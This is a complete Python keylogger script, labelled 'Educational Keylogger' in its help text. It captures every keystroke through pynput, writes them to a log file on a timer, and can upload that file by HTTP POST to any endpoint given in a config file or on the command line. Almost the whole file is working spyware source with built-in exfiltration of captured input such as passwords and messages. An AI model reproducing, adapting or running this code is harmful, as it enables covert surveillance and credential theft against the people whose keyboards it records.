#!/usr/bin/env python3







import argparse
import json
import logging
import os
import sys
import threading
import time

from datetime import datetime
from pathlib import Path

from pynput import keyboard  # 
import requests  # 

# ─── Configuration Loading ─────────────────────────────────────────────────────────
def load_config(path: Path) -> dict:
    try:
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Failed to load config {path}: {e}")
        sys.exit(1)

# ─── Keylogger Class ───────────────────────────────────────────────────────────────
class KeyLogger:
    def __init__(self, log_file: Path, upload_url: str = None, interval: int = 60):
        self.log_file = log_file
        self.upload_url = upload_url
        self.interval = interval
        self._buffer = []
        self._stop_event = threading.Event()
        logging.debug(f"Initialized KeyLogger with file={log_file}, url={upload_url}, interval={interval}")

    def _on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            else:
                char = f"[{key.name}]"
        self._buffer.append(char)
        logging.debug(f"Captured key: {char}")

    def _flush(self):
        if not self._buffer:
            return
        data = ''.join(self._buffer)
        try:
            with open(self.log_file, 'a') as f:
                f.write(f"{datetime.now()} - {data}")
            logging.info(f"Wrote {len(data)} chars to {self.log_file}")
            self._buffer.clear()
        except Exception as e:
            logging.error(f"Failed writing to {self.log_file}: {e}")
        if self.upload_url:
            self._upload()

    def _upload(self):
        try:
            with open(self.log_file, 'rb') as f:
                resp = requests.post(self.upload_url, files={'file': f})
            logging.info(f"Uploaded log, HTTP {resp.status_code}")
        except Exception as e:
            logging.error(f"Upload failed: {e}")

    def _reporter(self):
        while not self._stop_event.wait(self.interval):
            self._flush()

    def start(self):
        listener = keyboard.Listener(on_press=self._on_press)
        reporter = threading.Thread(target=self._reporter, daemon=True)
        listener.start(); reporter.start()
        logging.info("Keylogger started. Press Ctrl+C to stop.")
        try:
            listener.join()
        except KeyboardInterrupt:
            logging.info("Stopping keylogger...")
            self._stop_event.set()
            self._flush()
            sys.exit(0)

# ─── Main Entrypoint ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Educational Keylogger")
    parser.add_argument('--config', type=Path, help='Path to JSON config')
    parser.add_argument('--log-file', type=Path, default=Path('keylog.txt'))
    parser.add_argument('--upload-url', type=str, help='HTTP endpoint to upload logs')
    parser.add_argument('--interval', type=int, default=60, help='Flush interval (seconds)')
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()

    level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(level=level,
                        format='%(asctime)s %(levelname)s: %(message)s',
                        handlers=[logging.StreamHandler(),
                                  logging.FileHandler('keylogger.log', encoding='utf-8')])

    cfg = {}
    if args.config:
        cfg = load_config(args.config)

    log_file = cfg.get('log_file', str(args.log_file))
    upload_url = cfg.get('upload_url', args.upload_url)
    interval = cfg.get('interval', args.interval)

    kl = KeyLogger(Path(log_file), upload_url, interval)
    kl.start()

if __name__ == '__main__':
    main()
